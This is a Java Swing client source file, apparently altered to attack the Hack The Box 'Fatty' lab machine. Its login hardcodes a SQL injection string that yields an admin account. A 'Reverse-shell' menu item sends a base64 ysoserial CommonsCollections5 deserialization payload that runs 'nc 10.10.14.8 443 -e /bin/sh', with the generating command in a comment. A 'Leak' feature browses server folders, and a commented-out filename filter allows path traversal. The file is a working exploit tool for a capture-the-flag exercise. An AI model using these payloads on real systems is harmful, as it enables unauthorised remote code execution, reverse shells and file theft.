package htb.fatty.client.gui;

import htb.fatty.client.connection.Connection;
import htb.fatty.client.methods.Invoker;
import htb.fatty.shared.message.MessageBuildException;
import htb.fatty.shared.resources.User;
import java.awt.Color;
import java.awt.EventQueue;
import java.awt.Font;
import java.awt.LayoutManager;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.io.IOException;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JLayeredPane;
import javax.swing.JMenu;
import javax.swing.JMenuBar;
import javax.swing.JMenuItem;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JPasswordField;
import javax.swing.JTextField;
import javax.swing.JTextPane;
import javax.swing.border.EmptyBorder;

public class ClientGuiTest extends JFrame {
  private JPanel contentPane;
  
  private JTextField tfUsername;
  
  private JPasswordField tfPassword;
  
  private User user;
  
  private Connection conn;
  
  private Invoker invoker;
  
  private JTextField fileTextField;
  
  private JTextField textField_1;
  
  private JTextField textField_2;
  
  private String currentFolder = null;
  
  public static void main(String[] args) {
    EventQueue.invokeLater(new Runnable() {
          public void run() {
            try {
              ClientGuiTest frame = new ClientGuiTest();
              frame.setVisible(true);
            } catch (Exception e) {
              e.printStackTrace();
            } 
          }
        });
  }
  
  public ClientGuiTest() {
    setDefaultCloseOperation(3);
    setBounds(100, 100, 872, 691);
    JMenuBar menuBar = new JMenuBar();
    setJMenuBar(menuBar);
    JMenu fileMenu = new JMenu("File");
    menuBar.add(fileMenu);
    JMenuItem exit = new JMenuItem("Exit");
    fileMenu.add(exit);
    exit.addActionListener(new ActionListener() {
          public void actionPerformed(ActionEvent e) {
            if (ClientGuiTest.this.conn != null) {
              ClientGuiTest.this.conn.logoff();
              ClientGuiTest.this.conn.close();
            } 
            ClientGuiTest.this.dispose();
            System.exit(0);
          }
        });
    JMenu profileMenu = new JMenu("Profile");
    menuBar.add(profileMenu);
    final JMenuItem whoami = new JMenuItem("Whoami");
    whoami.setEnabled(false);
    profileMenu.add(whoami);
    final JMenuItem changePassword = new JMenuItem("ChangePassword");
    changePassword.setEnabled(false);
    profileMenu.add(changePassword);
    JMenu statusMenu = new JMenu("ServerStatus");
    menuBar.add(statusMenu);
    final JMenuItem uname = new JMenuItem("Uname");
    uname.setEnabled(false);
    statusMenu.add(uname);
    final JMenuItem users = new JMenuItem("Users");
    users.setEnabled(false);
    statusMenu.add(users);
    final JMenuItem netstat = new JMenuItem("Nestat");
    netstat.setEnabled(false);
    statusMenu.add(netstat);
    final JMenuItem ipconfig = new JMenuItem("Ipconfig");
    ipconfig.setEnabled(false);
    statusMenu.add(ipconfig);
    JMenu fileBrowser = new JMenu("Exploits");
    menuBar.add(fileBrowser);
    final JMenuItem revshell = new JMenuItem("Reverse-shell");
    revshell.setEnabled(false);
    fileBrowser.add(revshell);
    final JMenuItem dlserv = new JMenuItem("Download server");
    dlserv.setEnabled(false);
    fileBrowser.add(dlserv);
    final JMenuItem leak = new JMenuItem("Leak");
    leak.setEnabled(false);
    fileBrowser.add(leak);
    JMenu connectionTest = new JMenu("ConnectionTest");
    menuBar.add(connectionTest);
    final JMenuItem ping = new JMenuItem("Ping");
    ping.setEnabled(false);
    connectionTest.add(ping);
    JMenu help = new JMenu("Help");
    menuBar.add(help);
    JMenuItem contact = new JMenuItem("Contact");
    help.add(contact);
    contact.setEnabled(false);
    JMenuItem about = new JMenuItem("About");
    help.add(about);
    about.setEnabled(false);
    this.contentPane = new JPanel();
    this.contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
    setContentPane(this.contentPane);
    this.contentPane.setLayout((LayoutManager)null);
    JLayeredPane layeredPane = new JLayeredPane();
    layeredPane.setBounds(222, 193, 1, 1);
    this.contentPane.add(layeredPane);
    final JPanel controlPanel = new JPanel();
    controlPanel.setBounds(0, 0, 872, 638);
    controlPanel.setVisible(false);
    this.contentPane.add(controlPanel);
    controlPanel.setLayout((LayoutManager)null);
    JPanel panel = new JPanel();
    panel.setBackground(Color.WHITE);
    panel.setBounds(12, 12, 848, 583);
    controlPanel.add(panel);
    panel.setLayout((LayoutManager)null);
    final JTextPane textPane = new JTextPane();
    textPane.setEditable(false);
    textPane.setBounds(12, 12, 824, 559);
    panel.add(textPane);
    this.fileTextField = new JTextField();
    this.fileTextField.setBounds(28, 607, 164, 25);
    controlPanel.add(this.fileTextField);
    this.fileTextField.setColumns(10);
    JButton openFileButton = new JButton("Open");
    openFileButton.setBounds(204, 607, 114, 25);
    controlPanel.add(openFileButton);
    JButton btnClear = new JButton("Clear");
    btnClear.setBounds(731, 607, 114, 25);
    controlPanel.add(btnClear);
    final JPanel LoginPanel = new JPanel();
    LoginPanel.setBounds(12, 12, 944, 844);
    this.contentPane.add(LoginPanel);
    LoginPanel.setLayout((LayoutManager)null);
    JLabel lblNewLabel = new JLabel("Username:");
    lblNewLabel.setFont(new Font("Dialog", 1, 14));
    lblNewLabel.setBounds(118, 197, 151, 68);
    LoginPanel.add(lblNewLabel);
    this.tfUsername = new JTextField();
    this.tfUsername.setBounds(294, 218, 396, 27);
    LoginPanel.add(this.tfUsername);
    this.tfUsername.setColumns(10);
    this.tfPassword = new JPasswordField();
    this.tfPassword.setColumns(10);
    this.tfPassword.setBounds(294, 280, 396, 27);
    LoginPanel.add(this.tfPassword);
    JButton btnNewButton = new JButton("Login ");

    // SQL-injection
    String sqli = "'UNION ALL SELECT 2,'admin','chronos','password','admin' FROM users;#";
    ClientGuiTest.this.tfUsername.setText(sqli);
    ClientGuiTest.this.tfPassword.setText("password");

    btnNewButton.addActionListener(new ActionListener() {
          public void actionPerformed(ActionEvent e) {
            /*
            // Normal login
            String username = ClientGuiTest.this.tfUsername.getText().trim();
            String password = new String(ClientGuiTest.this.tfPassword.getPassword());
            ClientGuiTest.this.user = new User();
            ClientGuiTest.this.user.setUsername(username);
            ClientGuiTest.this.user.setPassword(password);
            */

            //SQL-injection to get admin account
            ClientGuiTest.this.user = new User(sqli, "password", false);
            
            try {
              ClientGuiTest.this.conn = Connection.getConnection();
            } catch (htb.fatty.client.connection.Connection.ConnectionException e1) {
              JOptionPane.showMessageDialog(LoginPanel, "Connection Error!", "Error", 0);
              return;
            } 
            if (ClientGuiTest.this.conn.login(ClientGuiTest.this.user)) {
              JOptionPane.showMessageDialog(LoginPanel, "Login Successful!", "Login", 1);
              LoginPanel.setVisible(false);
              String roleName = ClientGuiTest.this.conn.getRoleName();
              ClientGuiTest.this.user.setRoleByName(roleName);
              if (roleName.contentEquals("admin")) {
                uname.setEnabled(true);
                users.setEnabled(true);
                netstat.setEnabled(true);
                ipconfig.setEnabled(true);
                changePassword.setEnabled(true);
              } 
              if (!roleName.contentEquals("anonymous")) {
                whoami.setEnabled(true);
                revshell.setEnabled(true);
                dlserv.setEnabled(true);
                leak.setEnabled(true);
                ping.setEnabled(true);
              } 
              ClientGuiTest.this.invoker = new Invoker(ClientGuiTest.this.conn, ClientGuiTest.this.user);
              controlPanel.setVisible(true);
            } else {
              JOptionPane.showMessageDialog(LoginPanel, "Login Failed!", "Login", 1);
              ClientGuiTest.this.conn.close();
            } 
          }
        });
    btnNewButton.setBounds(572, 339, 117, 25);
    LoginPanel.add(btnNewButton);
    JLabel lblPassword = new JLabel("Password:");
    lblPassword.setFont(new Font("Dialog", 1, 14));
    lblPassword.setBounds(118, 259, 151, 68);
    LoginPanel.add(lblPassword);
    final JPanel passwordChange = new JPanel();
    passwordChange.setBounds(0, 0, 860, 638);
    passwordChange.setVisible(false);
    this.contentPane.add(passwordChange);
    passwordChange.setLayout((LayoutManager)null);
    this.textField_1 = new JTextField();
    this.textField_1.setBounds(355, 258, 263, 29);
    passwordChange.add(this.textField_1);
    this.textField_1.setColumns(10);
    JLabel lblOldPassword = new JLabel("Old Password:");
    lblOldPassword.setFont(new Font("Dialog", 1, 14));
    lblOldPassword.setBounds(206, 265, 131, 17);
    passwordChange.add(lblOldPassword);
    JLabel lblNewPassword = new JLabel("New Password:");
    lblNewPassword.setFont(new Font("Dialog", 1, 14));
    lblNewPassword.setBounds(206, 322, 131, 15);
    passwordChange.add(lblNewPassword);
    this.textField_2 = new JTextField();
    this.textField_2.setBounds(355, 308, 263, 29);
    passwordChange.add(this.textField_2);
    this.textField_2.setColumns(10);
    JButton pwChangeButton = new JButton("Change");
    pwChangeButton.setBounds(575, 349, 114, 25);
    passwordChange.add(pwChangeButton);
    about.addActionListener(new ActionListener() {
          public void actionPerformed(ActionEvent e) {
            String response = ClientGuiTest.this.invoker.about();
            textPane.setText(response);
          }
        });
    contact.addActionListener(new ActionListener() {
          public void actionPerformed(ActionEvent e) {
            String response = ClientGuiTest.this.invoker.contact();
            textPane.setText(response);
          }
        });
    btnClear.addActionListener(new ActionListener() {
          public void actionPerformed(ActionEvent e) {
            textPane.setText("");
          }
        });
    ping.addActionListener(new ActionListener() {
          public void actionPerformed(ActionEvent e) {
            String response = "";
            try {
              response = ClientGuiTest.this.invoker.ping();
            } catch (MessageBuildException|htb.fatty.shared.message.MessageParseException e1) {
              JOptionPane.showMessageDialog(controlPanel, "Failure during message building/parsing.", "Error", 0);
            } catch (IOException e2) {
              JOptionPane.showMessageDialog(controlPanel, "Unable to contact the server. If this problem remains, please close and reopen the client.", "Error", 0);
            } 
            textPane.setText(response);
          }
        });
    whoami.addActionListener(new ActionListener() {
          public void actionPerformed(ActionEvent e) {
            String response = "";
            try {
              response = ClientGuiTest.this.invoker.whoami();
            } catch (MessageBuildException|htb.fatty.shared.message.MessageParseException e1) {
              JOptionPane.showMessageDialog(controlPanel, "Failure during message building/parsing.", "Error", 0);
            } catch (IOException e2) {
              JOptionPane.showMessageDialog(controlPanel, "Unable to contact the server. If this problem remains, please close and reopen the client.", "Error", 0);
            } 
            textPane.setText(response);
          }
        });
    revshell.addActionListener(new ActionListener() {
          public void actionPerformed(ActionEvent e) {
            try {
               /* 
               Base64 payload for reverse-shell:
               java -jar ysoserial.jar CommonsCollections5 'nc IP PORT -e /bin/sh'| base64 -w 0 
               */
               String password = "rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAA3NyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIACEIABmZvcm1hdEkACmxpbmVOdW1iZXJMAA9jbGFzc0xvYWRlck5hbWVxAH4ABUwADmRlY2xhcmluZ0NsYXNzcQB+AAVMAAhmaWxlTmFtZXEAfgAFTAAKbWV0aG9kTmFtZXEAfgAFTAAKbW9kdWxlTmFtZXEAfgAFTAANbW9kdWxlVmVyc2lvbnEAfgAFeHABAAAAUXQAA2FwcHQAJnlzb3NlcmlhbC5wYXlsb2Fkcy5Db21tb25zQ29sbGVjdGlvbnM1dAAYQ29tbW9uc0NvbGxlY3Rpb25zNS5qYXZhdAAJZ2V0T2JqZWN0cHBzcQB+AAsBAAAAM3EAfgANcQB+AA5xAH4AD3EAfgAQcHBzcQB+AAsBAAAAInEAfgANdAAZeXNvc2VyaWFsLkdlbmVyYXRlUGF5bG9hZHQAFEdlbmVyYXRlUGF5bG9hZC5qYXZhdAAEbWFpbnBwc3IAH2phdmEudXRpbC5Db2xsZWN0aW9ucyRFbXB0eUxpc3R6uBe0PKee3gIAAHhweHNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXlxAH4AAUwAA21hcHQAD0xqYXZhL3V0aWwvTWFwO3hwdAADZm9vc3IAKm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5tYXAuTGF6eU1hcG7llIKeeRCUAwABTAAHZmFjdG9yeXQALExvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNoYWluZWRUcmFuc2Zvcm1lcjDHl+woepcEAgABWwANaVRyYW5zZm9ybWVyc3QALVtMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwdXIALVtMb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLlRyYW5zZm9ybWVyO71WKvHYNBiZAgAAeHAAAAAFc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5Db25zdGFudFRyYW5zZm9ybWVyWHaQEUECsZQCAAFMAAlpQ29uc3RhbnRxAH4AAXhwdnIAEWphdmEubGFuZy5SdW50aW1lAAAAAAAAAAAAAAB4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXEAfgAFWwALaVBhcmFtVHlwZXN0ABJbTGphdmEvbGFuZy9DbGFzczt4cHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJ0AApnZXRSdW50aW1ldXIAEltMamF2YS5sYW5nLkNsYXNzO6sW167LzVqZAgAAeHAAAAAAdAAJZ2V0TWV0aG9kdXEAfgAvAAAAAnZyABBqYXZhLmxhbmcuU3RyaW5noPCkOHo7s0ICAAB4cHZxAH4AL3NxAH4AKHVxAH4ALAAAAAJwdXEAfgAsAAAAAHQABmludm9rZXVxAH4ALwAAAAJ2cgAQamF2YS5sYW5nLk9iamVjdAAAAAAAAAAAAAAAeHB2cQB+ACxzcQB+ACh1cgATW0xqYXZhLmxhbmcuU3RyaW5nO63SVufpHXtHAgAAeHAAAAABdAAcbmMgMTAuMTAuMTQuOCA0NDMgLWUgL2Jpbi9zaHQABGV4ZWN1cQB+AC8AAAABcQB+ADRzcQB+ACRzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAAeHg="; 
               ClientGuiTest.this.invoker.changePW("admin", password);
            } catch(Exception e2) {
              JOptionPane.showMessageDialog(controlPanel, "Unable to contact the server. If this problem remains, please close and reopen the client.", "Error", 0);
            } 
            textPane.setText("Send reverse-shell payload!");
          }
        });
    dlserv.addActionListener(new ActionListener() {
          public void actionPerformed(ActionEvent e) {
            try {
              // Download server
              String response = ClientGuiTest.this.invoker.downloadServer();
              textPane.setText(response);
            } catch (Exception ex) {
              JOptionPane.showMessageDialog(controlPanel, ex.getMessage(), "Error", 0);
            } 
          }
        });
    leak.addActionListener(new ActionListener() {
          public void actionPerformed(ActionEvent e) {
            String response = "";

            // Leak inputted folder
            String folder = ClientGuiTest.this.fileTextField.getText();

            // If no folder is selected, current folder is set to mail
            if (folder.isEmpty())
            {
              folder = "mail";
            }
            ClientGuiTest.this.currentFolder = folder;
            try {
              response = ClientGuiTest.this.invoker.showFiles(folder);
            } catch (MessageBuildException|htb.fatty.shared.message.MessageParseException e1) {
              JOptionPane.showMessageDialog(controlPanel, "Failure during message building/parsing.", "Error", 0);
            } catch (IOException e2) {
              JOptionPane.showMessageDialog(controlPanel, "Unable to contact the server. If this problem remains, please close and reopen the client.", "Error", 0);
            } 
            textPane.setText(response);
          }
        });
    openFileButton.addActionListener(new ActionListener() {
          public void actionPerformed(ActionEvent e) {
            if (ClientGuiTest.this.currentFolder == null) {
              JOptionPane.showMessageDialog(controlPanel, "No folder selected! List a directory first!", "Error", 0);
              return;
            } 
            String response = "";
            String fileName = ClientGuiTest.this.fileTextField.getText();
            //fileName.replaceAll("[^a-zA-Z0-9.]", ""); //Remove filename filter
            try {
              response = ClientGuiTest.this.invoker.open(ClientGuiTest.this.currentFolder, fileName);
            } catch (MessageBuildException|htb.fatty.shared.message.MessageParseException e1) {
              JOptionPane.showMessageDialog(controlPanel, "Failure during message building/parsing.", "Error", 0);
            } catch (IOException e2) {
              JOptionPane.showMessageDialog(controlPanel, "Unable to contact the server. If this problem remains, please close and reopen the client.", "Error", 0);
            } 
            textPane.setText(response);
          }
        });
    uname.addActionListener(new ActionListener() {
          public void actionPerformed(ActionEvent e) {
            String response = "";
            try {
              response = ClientGuiTest.this.invoker.uname();
            } catch (MessageBuildException|htb.fatty.shared.message.MessageParseException e1) {
              JOptionPane.showMessageDialog(controlPanel, "Failure during message building/parsing.", "Error", 0);
            } catch (IOException e2) {
              JOptionPane.showMessageDialog(controlPanel, "Unable to contact the server. If this problem remains, please close and reopen the client.", "Error", 0);
            } 
            textPane.setText(response);
          }
        });
    users.addActionListener(new ActionListener() {
          public void actionPerformed(ActionEvent e) {
            String response = "";
            try {
              response = ClientGuiTest.this.invoker.users();
            } catch (MessageBuildException|htb.fatty.shared.message.MessageParseException e1) {
              JOptionPane.showMessageDialog(controlPanel, "Failure during message building/parsing.", "Error", 0);
            } catch (IOException e2) {
              JOptionPane.showMessageDialog(controlPanel, "Unable to contact the server. If this problem remains, please close and reopen the client.", "Error", 0);
            } 
            textPane.setText(response);
          }
        });
    ipconfig.addActionListener(new ActionListener() {
          public void actionPerformed(ActionEvent e) {
            String response = "";
            try {
              response = ClientGuiTest.this.invoker.ipconfig();
            } catch (MessageBuildException|htb.fatty.shared.message.MessageParseException e1) {
              JOptionPane.showMessageDialog(controlPanel, "Failure during message building/parsing.", "Error", 0);
            } catch (IOException e2) {
              JOptionPane.showMessageDialog(controlPanel, "Unable to contact the server. If this problem remains, please close and reopen the client.", "Error", 0);
            } 
            textPane.setText(response);
          }
        });
    netstat.addActionListener(new ActionListener() {
          public void actionPerformed(ActionEvent e) {
            String response = "";
            try {
              response = ClientGuiTest.this.invoker.netstat();
            } catch (MessageBuildException|htb.fatty.shared.message.MessageParseException e1) {
              JOptionPane.showMessageDialog(controlPanel, "Failure during message building/parsing.", "Error", 0);
            } catch (IOException e2) {
              JOptionPane.showMessageDialog(controlPanel, "Unable to contact the server. If this problem remains, please close and reopen the client.", "Error", 0);
            } 
            textPane.setText(response);
          }
        });
    changePassword.addActionListener(new ActionListener() {
          public void actionPerformed(ActionEvent e) {
            controlPanel.setVisible(false);
            passwordChange.setVisible(true);
          }
        });
    pwChangeButton.addActionListener(new ActionListener() {
          public void actionPerformed(ActionEvent e) {
            String password = ClientGuiTest.this.textField_2.getText();
            try {
              ClientGuiTest.this.invoker.changePW("admin", password);
            } catch (IOException iOException) {
              JOptionPane.showMessageDialog(controlPanel, iOException.getMessage(), "Error", 0);
            } catch (MessageBuildException|htb.fatty.shared.message.MessageParseException messageBuildException) {
              JOptionPane.showMessageDialog(controlPanel, messageBuildException.getMessage(), "Error", 0);
            } 
          }
        });
    addWindowListener(new WindowAdapter() {
          public void windowClosing(WindowEvent e) {
            System.out.println("Closed");
            if (ClientGuiTest.this.conn != null) {
              ClientGuiTest.this.conn.logoff();
              ClientGuiTest.this.conn.close();
            } 
            e.getWindow().dispose();
            System.exit(0);
          }
        });
  }
}

